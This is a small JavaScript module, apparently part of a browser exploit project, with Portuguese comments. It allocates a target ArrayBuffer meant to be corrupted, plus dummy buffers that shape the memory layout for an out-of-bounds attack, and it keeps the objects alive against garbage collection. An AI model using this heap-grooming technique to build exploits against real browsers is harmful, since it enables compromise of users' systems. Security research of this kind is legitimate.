// js/script3/arraybuffer_allocator.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Aloca múltiplos ArrayBuffers e DataViews para criar layout previsível
export function allocateTargetArrayBuffers() {
    const FNAME = "allocateTargetArrayBuffers";
    logS3("Alocando ArrayBuffers e DataViews...", "info", FNAME);

    // ArrayBuffer legítimo que será corrompido
    const legitAB = new ArrayBuffer(0x1000); // Tamanho arbitrário
    const legitDV = new DataView(legitAB);

    // ArrayBuffers "inocentes" para controlar o layout da memória
    const dummyABs = [];
    for (let i = 0; i < 10; i++) {
        dummyABs.push(new ArrayBuffer(0x1000));
    }

    logS3(`ArrayBuffer legítimo alocado: ${legitAB.byteLength} bytes`, "info", FNAME);
    return { legitAB, legitDV, dummyABs };
}

// Mantém os objetos vivos para evitar coleta de lixo
let gReferences = [];
export function pinObjects(...objs) {
    gReferences.push(...objs);
}
